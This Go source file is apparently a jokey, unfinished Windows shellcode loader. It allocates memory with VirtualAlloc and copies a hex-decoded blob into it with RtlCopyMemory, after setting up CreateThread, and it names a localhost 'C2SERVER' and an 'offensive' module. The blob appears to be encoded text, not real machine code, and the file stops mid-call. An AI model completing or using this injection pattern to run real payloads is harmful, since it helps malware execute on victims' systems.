package main

import (
	"encoding/hex"
	"golang.org/x/sys/windows"
	"log"
	"unsafe" // this is very safe
	"vcs.fckcopyright.com/offensive/go_modules"
)

const C2SERVER string = "127.0.0.1"

var (
	kernel32      = windows.NewLazySystemDLL("kernel32.dll")
	rtlCopyMemory = kernel32.NewProc("RtlCopyMemory")
	createThread  = kernel32.NewProc("CreateThread")
	
)

func main() {
	very_normal_variable, _ := hex.DecodeString("59326a6875346b67626d6a68753639755a794230614f47367357356e4947356e6453427434627562615344456b6547376a574d67784a4847734f47376f324d675a4d4f79626d636759326a687536386762734f67655341394b536b6762634f67494750467157356e49474e6f3462754a49475044737942755a335567626547376d326b67784a4670494754687534746a6143427a6147567362474e765a475567636d456751564e4453556b3d")

	not_executing_anything_just_creating_value_for_society, err := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(very_normal_variable)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if err != nil {
		log.Fatal("Error while VirtualAlloc:", err)
	}

	_, _, err = rtlCopyMemory.Call(
		not_executing_anything_just_creating_value_for_society,
		(uintptr)(unsafe.Pointer(&very_normal_variable[0])),
	// I will finish this tomorrow. I think the cops are after me.